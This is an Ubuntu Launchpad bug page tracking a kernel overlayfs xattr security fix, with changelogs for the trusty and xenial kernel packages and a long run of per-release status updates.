linux (3.13.0-78.122) trusty; urgency=low
[ Brad Figg ]
\* Release Tracking Bug
- LP: #1540559
[ Eric Dumazet ]
\* SAUCE: (no-up) udp: properly support MSG\_PEEK with truncated buffers
- LP: #1527902
[ J. R. Okajima ]
\* SAUCE: ubuntu: aufs: tiny, extract a new func xino\_fwrite\_wkq()
- LP: #1533043
\* SAUCE: ubuntu: aufs: for 4.3, XINO handles EINTR from the dying process
- LP: #1533043
[ Upstream Kernel Changes ]
\* Revert "[stable-only] net: add length argument to
skb\_copy\_and\_csum\_datagram\_iovec"
- LP: #1538756
\* unregister\_netdevice : move RTM\_DELLINK to until after ndo\_uninit
- LP: #1525324
\* rtnetlink: delay RTM\_DELLINK notification until after ndo\_uninit()
- LP: #1525324
\* Drivers: hv: Eliminate the channel spinlock in the callback path
- LP: #1519897
\* Drivers: hv: vmbus: Implement per-CPU mapping of relid to channel
- LP: #1519897
\* Drivers: hv: vmbus: Suport an API to send pagebuffers with additional
control
- LP: #1519897
\* Drivers: hv: vmbus: Suport an API to send packet with additional
control
- LP: #1519897
\* Drivers: hv: vmbus: Export the vmbus\_sendpacket\_pagebuffer\_ctl()
- LP: #1519897
\* Drivers: hv: vmbus: Fix a siganlling host signalling issue
- LP: #1519897
\* Drivers: hv: vmbus: Fix a Host signaling bug
- LP: #1519897
\* ARC: Fix silly typo in MAINTAINERS file
- LP: #1538756
\* ip6mr: call del\_timer\_sync() in ip6mr\_free\_table()
- LP: #1538756
\* gre6: allow to update all parameters via rtnl
- LP: #1538756
\* atl1c: Improve driver not to do order 4 GFP\_ATOMIC allocation
- LP: #1538756
\* sctp: use the same clock as if sock source timestamps were on
- LP: #1538756
\* sctp: update the netstamp\_needed counter when copying sockets
- LP: #1538756
\* ipv6: sctp: clone options to avoid use after free
- LP: #1538756
\* net: add validation for the socket syscall protocol argument
- LP: #1538756
\* sh\_eth: fix kernel oops in skb\_put()
- LP: #1538756
\* pptp: verify sockaddr\_len in pptp\_bind() and pptp\_connect()
- LP: #1538756
\* bluetooth: Validate socket address length in sco\_sock\_bind().
- LP: #1538756
\* af\_unix: Revert 'lock\_interruptible' in stream receive code
- LP: #1538756
\* KEYS: Fix race between read and revoke
- LP: #1538756
\* tools: Add a "make all" rule
- LP: #1538756
\* efi: Disable interrupts around EFI calls, not in the epilog/prolog
calls
- LP: #1538756
\* net: ipmr: fix static mfc/dev leaks on table destruction
- LP: #1538756
\* fuse: break infinite loop in fuse\_fill\_write\_pages()
- LP: #1538756
\* usb: gadget: pxa27x: fix suspend callback
- LP: #1538756
\* iio: fix some warning messages
- LP: #1538756
\* USB: cp210x: Remove CP2110 ID from compatibility list
- LP: #1538756
\* USB: cdc\_acm: Ignore Infineon Flash Loader utility
- LP: #1538756
\* USB: serial: Another Infineon flash loader USB ID
- LP: #1538756
\* ext4: Fix handling of extended tv\_sec
- LP: #1538756
\* jbd2: Fix unreclaimed pages after truncate in data=journal mode
- LP: #1538756
\* drm/ttm: Fixed a read/write lock imbalance
- LP: #1538756
\* i2c: mv64xxx: The n clockdiv factor is 0 based on sunxi SoCs
- LP: #1538756
\* AHCI: Fix softreset failed issue of Port Multiplier
- LP: #1538756
\* sata\_sil: disable trim
- LP: #1538756
\* staging: lustre: echo\_copy..\_lsm() dereferences userland pointers
directly
- LP: #1538756
\* irqchip/versatile-fpga: Fix PCI IRQ mapping on Versatile PB
- LP: #1538756
\* usb: core : hub: Fix BOS 'NULL pointer' kernel panic
- LP: #1538756
\* USB: whci-hcd: add check for dma mapping error
- LP: #1538756
\* usb: Use the USB\_SS\_MULT() macro to decode burst multiplier for log
message
- LP: #1538756
\* dm btree: fix leak of bufio-backed block in btree\_split\_sibling error
path
- LP: #1538756
\* SCSI: Fix NULL pointer dereference in runtime PM
- LP: #1538756
\* usb: xhci: fix config fail of FS hub behind a HS hub with MTT
- LP: #1538756
\* ALSA: rme96: Fix unexpected volume reset after rate changes
- LP: #1538756
\* ALSA: hda - Add inverted dmic for Packard Bell DOTS
- LP: #1523232, #1538756
\* virtio: fix memory leak of virtio ida cache layers
- LP: #1538756
\* 9p: ->evict\_inode() should kick out ->i\_data, not ->i\_mapping
- LP: #1538756
\* radeon/cik: Fix GFX IB test on Big-Endian
- LP: #1538756
\* crypto: skcipher - Copy iv from desc even for 0-len walks
- LP: #1538756
\* dm thin metadata: fix bug when taking a metadata snapshot
- LP: #1538756
\* dm space map metadata: fix ref counting bug when bootstrapping a new
space map
- LP: #1538756
\* ipmi: move timer init to before irq is setup
- LP: #1538756
\* KVM: PPC: Book3S HV: Prohibit setting illegal transaction state in MSR
- LP: #1538756
\* rfkill: copy the name into the rfkill struct
- LP: #1538756
\* dm btree: fix bufio buffer leaks in dm\_btree\_del() error path
- LP: #1538756
\* ses: Fix problems with simple enclosures
- LP: #1538756
\* vgaarb: fix signal handling in vga\_get()
- LP: #1538756
\* ses: fix additional element traversal bug
- LP: #1538756
\* xhci: fix usb2 resume timing and races.
- LP: #1538756
\* USB: add quirk for devices with broken LPM
- LP: #1538756
\* powercap / RAPL: fix BIOS lock check
- LP: #1538756
\* parisc iommu: fix panic due to trying to allocate too large region
- LP: #1538756
\* mm, vmstat: allow WQ concurrency to discover memory reclaim doesn't
make any progress
- LP: #1538756
\* mm: hugetlb: call huge\_pte\_alloc() only if ptep is null
- LP: #1538756
\* drivers/base/memory.c: prohibit offlining of memory blocks with missing
sections
- LP: #1538756
\* sh64: fix \_\_NR\_fgetxattr
- LP: #1538756
\* n\_tty: Fix poll() after buffer-limited eof push read
- LP: #1538756
\* tty: Fix GPF in flush\_to\_ldisc()
- LP: #1538756
\* genirq: Prevent chip buslock deadlock
- LP: #1538756
\* ALSA: usb-audio: Add a more accurate volume quirk for AudioQuest
DragonFly
- LP: #1538756
\* ARM: 8471/1: need to save/restore arm register(r11) when it is
corrupted
- LP: #1538756
\* spi: fix parent-device reference leak
- LP: #1538756
\* scripts: recordmcount: break hardlinks
- LP: #1538756
\* ftrace/scripts: Have recordmcount copy the object file
- LP: #1538756
\* ARC: dw2 unwind: Reinstante unwinding out of modules
- LP: #1538756
\* ARC: dw2 unwind: Ignore CIE version !=1 gracefully instead of bailing
- LP: #1538756
\* ALSA: hda - Set SKL+ hda controller power at freeze() and thaw()
- LP: #1538756
\* s390/dis: Fix handling of format specifiers
- LP: #1538756
\* USB: ipaq.c: fix a timeout loop
- LP: #1538756
\* USB: fix invalid memory access in hub\_activate()
- LP: #1538756
\* x86/mce: Ensure offline CPUs don't participate in rendezvous process
- LP: #1538756
\* parisc: Fix syscall restarts
- LP: #1538756
\* ALSA: hda/realtek - Fix silent headphone output on MacPro 4,1 (v2)
- LP: #1538756
\* ASoC: arizona: Fix bclk for sample rates that are multiple of 4kHz
- LP: #1538756
\* mm/memory\_hotplug.c: check for missing sections in
test\_pages\_in\_a\_zone()
- LP: #1538756
\* ftrace/scripts: Fix incorrect use of sprintf in recordmcount
- LP: #1538756
\* tracing: Fix setting of start\_index in find\_next()
- LP: #1538756
\* async\_tx: use GFP\_NOWAIT rather than GFP\_IO
- LP: #1538756
\* dts: vt8500: Add SDHC node to DTS file for WM8650
- LP: #1538756
\* ftrace/module: Call clean up function when module init fails early
- LP: #1538756
\* vmstat: allocate vmstat\_wq before it is used
- LP: #1538756
\* firmware: dmi\_scan: Fix UUID endianness for SMBIOS >= 2.6
- LP: #1538756
\* kvm: x86: only channel 0 of the i8254 is linked to the HPET
- LP: #1538756
\* ipv6/addrlabel: fix ip6addrlbl\_get()
- LP: #1538756
\* net: fix warnings in 'make htmldocs' by moving macro definition out of
field declaration
- LP: #1538756
\* ser\_gigaset: fix deallocation of platform device structure
- LP: #1538756
\* pinctrl: bcm2835: Fix initial value for direction\_output
- LP: #1538756
\* mISDN: fix a loop count
- LP: #1538756
\* sh\_eth: fix TX buffer byte-swapping
- LP: #1538756
\* qlcnic: fix a timeout loop
- LP: #1538756
\* net: phy: mdio-mux: Check return value of mdiobus\_alloc()
- LP: #1538756
\* include/linux/mmdebug.h: should include linux/bug.h
- LP: #1538756
\* net: possible use after free in dst\_release
- LP: #1538756
\* Linux 3.13.11-ckt33
- LP: #1538756
\* xfrm: dst\_entries\_init() per-net dst\_ops
- LP: #1486670
-- Luis Henriques <luis.henriques@canonical.com> Fri, 19 Feb 2016 13:14:25 +0000

| Changed in linux (Ubuntu Trusty): | |
| --- | --- |
| **status**: | New → Fix Released |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-02-22

| **information type**: | Private Security → Public Security |
| --- | --- |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-02-24

| **tags**: | added: kernel-cve-skip-description |
| --- | --- |
| Changed in linux-lts-trusty (Ubuntu Precise): | |
| **status**: | New → Fix Released |
| **importance**: | Undecided → Medium |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-02-24

| Changed in linux-lts-trusty (Ubuntu Wily): | |
| --- | --- |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-trusty (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-trusty (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-wily (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-wily (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-wily (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-wily (Ubuntu Trusty): | |
| **status**: | New → Fix Released |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-quantal (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-quantal (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-quantal (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-quantal (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux (Ubuntu Precise): | |
| **importance**: | Undecided → Medium |
| Changed in linux (Ubuntu Wily): | |
| **importance**: | Undecided → Medium |
| Changed in linux (Ubuntu Xenial): | |
| **importance**: | High → Medium |
| Changed in linux (Ubuntu Trusty): | |
| **importance**: | Undecided → Medium |
| Changed in linux-ti-omap4 (Ubuntu Precise): | |
| **importance**: | Undecided → Medium |
| Changed in linux-ti-omap4 (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-ti-omap4 (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-ti-omap4 (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-raring (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-raring (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-raring (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-raring (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-armadaxp (Ubuntu Precise): | |
| **importance**: | Undecided → Medium |
| Changed in linux-armadaxp (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-armadaxp (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-armadaxp (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-xenial (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-xenial (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-xenial (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-xenial (Ubuntu Trusty): | |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-saucy (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-saucy (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-saucy (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-saucy (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-manta (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-manta (Ubuntu Wily): | |
| **importance**: | Undecided → Medium |
| Changed in linux-manta (Ubuntu Xenial): | |
| **importance**: | Undecided → Medium |
| Changed in linux-manta (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-vivid (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-vivid (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-vivid (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-vivid (Ubuntu Trusty): | |
| **status**: | New → Fix Released |
| **importance**: | Undecided → Medium |
| Changed in linux-raspi2 (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-raspi2 (Ubuntu Wily): | |
| **status**: | New → Fix Released |
| **importance**: | Undecided → Medium |
| Changed in linux-raspi2 (Ubuntu Xenial): | |
| **importance**: | Undecided → Medium |
| Changed in linux-raspi2 (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-mako (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-mako (Ubuntu Wily): | |
| **importance**: | Undecided → Medium |
| Changed in linux-mako (Ubuntu Xenial): | |
| **importance**: | Undecided → Medium |
| Changed in linux-mako (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-utopic (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-utopic (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-utopic (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-lts-utopic (Ubuntu Trusty): | |
| **status**: | New → Fix Released |
| **importance**: | Undecided → Medium |
| Changed in linux-goldfish (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-goldfish (Ubuntu Wily): | |
| **importance**: | Undecided → Medium |
| Changed in linux-goldfish (Ubuntu Xenial): | |
| **importance**: | Undecided → Medium |
| Changed in linux-goldfish (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-flo (Ubuntu Precise): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-flo (Ubuntu Wily): | |
| **importance**: | Undecided → Medium |
| Changed in linux-flo (Ubuntu Xenial): | |
| **importance**: | Undecided → Medium |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-02-24

| Changed in linux-flo (Ubuntu Trusty): | |
| --- | --- |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-02-26: |  |  | [#12](/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/12) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1534961/comments/12/%2Bdownload) (10.1 KiB)

This bug was fixed in the package linux - 4.4.0-8.23

---------------

linux (4.4.0-8.23) xenial; urgency=low

\* cgroup namespace mounts broken in containers (LP: [#1549398](/bugs/1549398))

    - SAUCE: kernfs: Always set super block owner to init\_user\_ns

\* 4.4.0-7.22 no longer boots on arm64 (LP: [#1547718](/bugs/1547718))

    - arm64: mm: avoid calling apply\_to\_page\_range on empty range

    - UBUNTU SAUCE: arm: mm: avoid calling apply\_to\_page\_range on empty range

\* kernel install failed /bin/cp: cannot stat ‘/boot/initrd.img-4.3.0-7-generic’: No such file or directory (LP: [#1536810](/bugs/1536810))

    - [Config] postinst -- handle recreating symlinks when a real file is present

\* insecure overlayfs xattrs handling in copy\_up (LP: [#1534961](/bugs/1534961))

    - SAUCE: cred: Add clone\_cred() interface

    - SAUCE: overlayfs: Use mounter's credentials instead of selectively raising caps

    - SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\* xattrs

    - SAUCE: overlayfs: Be more careful about copying up sxid files

    - SAUCE: overlayfs: Propogate nosuid from lower and upper mounts

\* overlayfs over fuse should refuse copy\_up of files if uid/gid not mapped (LP: [#1535150](/bugs/1535150))

    - SAUCE: cred: Add clone\_cred() interface

    - SAUCE: overlayfs: Use mounter's credentials instead of selectively raising caps

    - SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\* xattrs

    - SAUCE: overlayfs: Be more careful about copying up sxid files

    - SAUCE: overlayfs: Propogate nosuid from lower and upper mounts

\* overlay: mkdir fails if directory exists in lowerdir in a user namespace (LP: [#1531747](/bugs/1531747))

    - SAUCE: cred: Add clone\_cred() interface

    - SAUCE: overlayfs: Use mounter's credentials instead of selectively raising caps

    - SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\* xattrs

\* Update Intel ethernet drivers to Fortville SW5 (LP: [#1547674](/bugs/1547674))

    - net: bulk free infrastructure for NAPI context, use napi\_consume\_skb

    - net: Add eth\_platform\_get\_mac\_address() helper.

    - i40e: Add mac\_filter\_element at the end of the list instead of HEAD

    - i40e/i40evf: Fix RSS rx-flow-hash configuration through ethtool

    - i40e: Replace X722 mac check in ethtool get\_settings

    - i40evf: allow channel bonding of VFs

    - i40e: define function capabilities in only one place

    - i40evf: null out ring pointers on free

    - i40e: Cleanup the code with respect to restarting autoneg

    - i40e: update features with right offload

    - i40e: bump version to 1.4.10

    - i40e: add new device IDs for X722

    - i40e: Extend ethtool RSS hooks for X722

    - i40e/i40evf: Fix for UDP/TCP RSS for X722

    - i40evf: add new write-back mode

    - i40e/i40evf: Use private workqueue

    - i40e: add new proxy-wol bit for X722

    - i40e: Limit DCB FW version checks to X710/XL710 devices

    - i40e: AQ Add Run PHY Activity struct

    - i40e: AQ Geneve cloud tunnel type

    - i40e: AQ Add external power class to get link status

    - i40e: add 100Mb ethtool reporting

    - ixgbe: bulk free SKBs during TX completion cleanup cycle

    - igb: Remove unnecessary flag setting in igb\_set\_flag\_queue\_pairs()

    - igb: Unpair the queues when changing the number of queues...

This bug was fixed in the package linux - 4.4.0-8.23
---------------
linux (4.4.0-8.23) xenial; urgency=low
\* cgroup namespace mounts broken in containers (LP: #1549398)
- SAUCE: kernfs: Always set super block owner to init\_user\_ns
\* 4.4.0-7.22 no longer boots on arm64 (LP: #1547718)
- arm64: mm: avoid calling apply\_to\_page\_range on empty range
- UBUNTU SAUCE: arm: mm: avoid calling apply\_to\_page\_range on empty range
\* kernel install failed /bin/cp: cannot stat ‘/boot/initrd.img-4.3.0-7-generic’: No such file or directory (LP: #1536810)
- [Config] postinst -- handle recreating symlinks when a real file is present
\* insecure overlayfs xattrs handling in copy\_up (LP: #1534961)
- SAUCE: cred: Add clone\_cred() interface
- SAUCE: overlayfs: Use mounter's credentials instead of selectively raising caps
- SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\* xattrs
- SAUCE: overlayfs: Be more careful about copying up sxid files
- SAUCE: overlayfs: Propogate nosuid from lower and upper mounts
\* overlayfs over fuse should refuse copy\_up of files if uid/gid not mapped (LP: #1535150)
- SAUCE: cred: Add clone\_cred() interface
- SAUCE: overlayfs: Use mounter's credentials instead of selectively raising caps
- SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\* xattrs
- SAUCE: overlayfs: Be more careful about copying up sxid files
- SAUCE: overlayfs: Propogate nosuid from lower and upper mounts
\* overlay: mkdir fails if directory exists in lowerdir in a user namespace (LP: #1531747)
- SAUCE: cred: Add clone\_cred() interface
- SAUCE: overlayfs: Use mounter's credentials instead of selectively raising caps
- SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.\* xattrs
\* Update Intel ethernet drivers to Fortville SW5 (LP: #1547674)
- net: bulk free infrastructure for NAPI context, use napi\_consume\_skb
- net: Add eth\_platform\_get\_mac\_address() helper.
- i40e: Add mac\_filter\_element at the end of the list instead of HEAD
- i40e/i40evf: Fix RSS rx-flow-hash configuration through ethtool
- i40e: Replace X722 mac check in ethtool get\_settings
- i40evf: allow channel bonding of VFs
- i40e: define function capabilities in only one place
- i40evf: null out ring pointers on free
- i40e: Cleanup the code with respect to restarting autoneg
- i40e: update features with right offload
- i40e: bump version to 1.4.10
- i40e: add new device IDs for X722
- i40e: Extend ethtool RSS hooks for X722
- i40e/i40evf: Fix for UDP/TCP RSS for X722
- i40evf: add new write-back mode
- i40e/i40evf: Use private workqueue
- i40e: add new proxy-wol bit for X722
- i40e: Limit DCB FW version checks to X710/XL710 devices
- i40e: AQ Add Run PHY Activity struct
- i40e: AQ Geneve cloud tunnel type
- i40e: AQ Add external power class to get link status
- i40e: add 100Mb ethtool reporting
- ixgbe: bulk free SKBs during TX completion cleanup cycle
- igb: Remove unnecessary flag setting in igb\_set\_flag\_queue\_pairs()
- igb: Unpair the queues when changing the number of queues
- igb/igbvf: don't give up
- igb: clean up code for setting MAC address
- igb: Refactor VFTA configuration
- igb: Allow asymmetric configuration of MTU versus Rx frame size
- igb: Do not factor VLANs into RLPML calculation
- igb: Always enable VLAN 0 even if 8021q is not loaded
- igb: Merge VLVF configuration into igb\_vfta\_set
- igb: Clean-up configuration of VF port VLANs
- igb: Add support for VLAN promiscuous with SR-IOV and NTUPLE
- igb: Drop unnecessary checks in transmit path
- igb: Enable use of "bridge fdb add" to set unicast table entries
- igb: Add workaround for VLAN tag stripping on 82576
- i40e: AQ Shared resource flags
- i40e: AQ Add set\_switch\_config
- i40e: AQ Add VXLAN-GPE tunnel type
- i40e: AQ thermal sensor control struct
- i40e: Bump AQ minor version to 1.5 for new FW features
- i40e: Store lan\_vsi\_idx and lan\_vsi\_id in the right size
- i40e: fix write-back-on-itr to work with legacy itr
- i40e: add counter for arq overflows
- i40e: add 20G speed for Tx bandwidth calculations
- i40e: refactor DCB function
- i40e: add a little more to an NVM update debug message
- i40evf: enable bus master after reset
- i40e: add netdev info to VSI dump
- i40e: remove VF device IDs from PF
- i40e: trivial: remove unnecessary local var
- i40e/i40evf: Bump i40e to 1.4.11 and i40evf to 1.4.7
- net: ixgbe: add minimal parser details for ixgbe
- i40e: trivial: drop duplicate definition
- i40e: trivial: fix missing space
- i40e: fix bug in dma sync
- i40e: do TSO only if CHECKSUM\_PARTIAL is set
- i40e: allocate memory safer
- i40e: fix: do not sleep in netdev\_ops
- i40e: APIs to Add/remove port mirroring rules
- i40e: negate PHY int mask bits
- i40e: drop unused function
- i40e: count allocation errors
- i40e: avoid large memcpy by assigning struct
- i40e/i40evf: bump version to 1.4.12/1.4.8
- i40e: Enable Geneve offload for FW API ver > 1.4 for XL710/X710 devices
- i40e: add priv flag for automatic rule eviction
- i40e: use eth\_platform\_get\_mac\_address()
- i40e: move sync\_vsi\_filters up in service\_task
- i40e: Make the DCB firmware checks for X710/XL710 only
- i40e: set shared bit for multicast filters
- i40e: add VEB stat control and remove L2 cloud filter
- i40e: use new add\_veb calling with VEB stats control
- i40e: Refactor force\_wb and WB\_ON\_ITR functionality code
- i40evf: Change vf driver string to reflect all products i40evf supports
- i40e/i40evf: don't lose interrupts
- i40e/i40evf: try again after failure
- i40e: dump descriptor indexes in hex
- i40e/i40evf: use \_\_GFP\_NOWARN
- i40e/i40evf: use pages correctly in Rx
- i40e/i40evf: use logical operators, not bitwise
- i40e: properly show packet split status in debugfs
- i40e/i40evf: Bump version
- ixgbe: use u32 instead of \_\_u32 in model header
- ixgbe: fix dates on header of ixgbe\_model.h
- i40e: get rid of magic number
- i40e: drop unused debugfs file "dump"
- i40evf: support packet split receive
- i40e: trivial: cleanup use of pf->hw
- i40e: Add a SW workaround for lost interrupts
- i40e: Fix PROMISC mode for Multi-function per port (MFP) devices
- i40e: Removal of code which relies on BASE VEB SEID
- i40e/i40evf: avoid atomics
- i40e: Do not disable queues in the Legacy/MSI Interrupt handler
- i40e: expand comment
- i40e: better error reporting for nvmupdate
- i40evf: set adapter state on reset failure
- i40e: clean event descriptor before use
- i40e: When in promisc mode apply promisc mode to Tx Traffic as well
- i40e/i40evf: Bump i40e to 1.4.15 and i40evf to 1.4.11.
- i40e/i40evf: Drop outer checksum offload that was not requested
- i40e/i40evf: Use u64 values instead of casting them in TSO function
- i40e/i40evf: Factor out L4 header and checksum from L3 bits in TSO path
- i40e/i40evf: Consolidate all header changes into TSO function
- i40e/i40evf: Replace header pointers with unions of pointers in Tx checksum path
- i40e/i40evf: Add support for IPv4 encapsulated in IPv6
- i40e/i40evf: Handle IPv6 extension headers in checksum offload
- i40e/i40evf: Do not write to descriptor unless we complete
- i40e/i40evf: Add exception handling for Tx checksum
- i40e/i40evf: Clean-up Rx packet checksum handling
- i40e/i40evf: Enable support for SKB\_GSO\_UDP\_TUNNEL\_CSUM
- i40e: Fix ATR in relation to tunnels
- i40e: Do not drop support for IPv6 VXLAN or GENEVE tunnels
- i40e: Update feature flags to reflect newly enabled features
- i40evf: Update feature flags to reflect newly enabled features
- i40e: Add support for ATR w/ IPv6 extension headers
- i40e/i40evf: Break up xmit\_descriptor\_count from maybe\_stop\_tx
- i40e/i40evf: Rewrite logic for 8 descriptor per packet check
- i40e/i40evf: Move Tx checksum closer to TSO
- i40e: Add functions to blink led on 10GBaseT PHY
- i40e: Fix led blink capability for 10GBaseT PHY
- i40e: Increase timeout when checking GLGEN\_RSTAT\_DEVSTATE bit
- i40e: Do not wait for Rx queue disable in DCB reconfig
- i40e: Fix for unexpected messaging
- i40e: Expose some registers to program parser, FD and RSS logic
- i40e: add check for null VSI
- i40e: add adminq commands for Rx CTL registers
- i40e: implement and use Rx CTL helper functions
- i40e: Use the new rx ctl register helpers. Don't use AQ calls from clear\_hw.
- i40e: suspend scheduling during driver unload
- i40e: let go of the past
- i40e/i40evf: Bump i40e to 1.4.25 and i40evf to 1.4.15
\* MPT3SAS Driver update for next kernel release (LP: #1512221)
- mpt3sas: A correction in unmap\_resources
- mpt3sas: Added support for high port count HBA variants.
- mpt3sas: Used IEEE SGL instead of MPI SGL while framing a SMP Passthrough request message.
- mpt3sas: Fix static analyzer(coverity) tool identified defects
- mpt3sas: Never block the Enclosure device
- mpt3sas: Make use of additional HighPriority credit message frames for sending SCSI IO's
- mpt3sas: Added smp\_affinity\_enable module parameter.
- mpt3sas: Add support for configurable Chain Frame Size
- mpt3sas: Updated MPI Header to 2.00.42
- mpt3sas: Fix for Asynchronous completion of timedout IO and task abort of timedout IO.
- mpt3sas: Updating mpt3sas driver version to 12.100.00.00
- mpt3sas: Remove cpumask\_clear for zalloc\_cpumask\_var and don't free free\_cpu\_mask\_var before reply\_q
\* /sys/class/scsi\_host/hostN/partition\_number and .../mad\_version showing up BE on LE Ubuntu. (ibmvscsi) (LP: #1547153)
- ibmvscsi: Add endian conversions to sysfs attribute show functions
\* Miscellaneous Ubuntu changes
- [Packaging] git-ubuntu-log -- output should be utf-8
- [Packaging] git-ubuntu-log -- handle invalid or private bugs
-- Andy Whitcroft <apw@canonical.com> Wed, 24 Feb 2016 20:34:49 +0000

| Changed in linux (Ubuntu Xenial): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-04-15

| Changed in linux-lts-xenial (Ubuntu Trusty): | |
| --- | --- |
| **status**: | New → Invalid |
| Changed in linux-raspi2 (Ubuntu Xenial): | |
| **status**: | New → Invalid |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-04-19

| Changed in linux-manta (Ubuntu Xenial): | |
| --- | --- |
| **status**: | New → Invalid |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-05-06

| Changed in linux-snapdragon (Ubuntu Precise): | |
| --- | --- |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-snapdragon (Ubuntu Wily): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-snapdragon (Ubuntu Xenial): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-snapdragon (Ubuntu Yakkety): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |
| Changed in linux-snapdragon (Ubuntu Trusty): | |
| **status**: | New → Invalid |
| **importance**: | Undecided → Medium |

[Steve Beattie (sbeattie)](https://launchpad.net/~sbeattie)
on 2016-06-07

| **tags**: | added: kernel-cve-tracking-bug |
| --- | --- |

[Mathew Hodson (mhodson)](https://launchpad.net/~mhodson)
on 2016-06-10

| Changed in linux (Ubuntu Vivid): | |
| --- | --- |
| **importance**: | Undecided → Medium |

[Mathew Hodson (mhodson)](https://launchpad.net/~mhodson)
on 2016-07-23

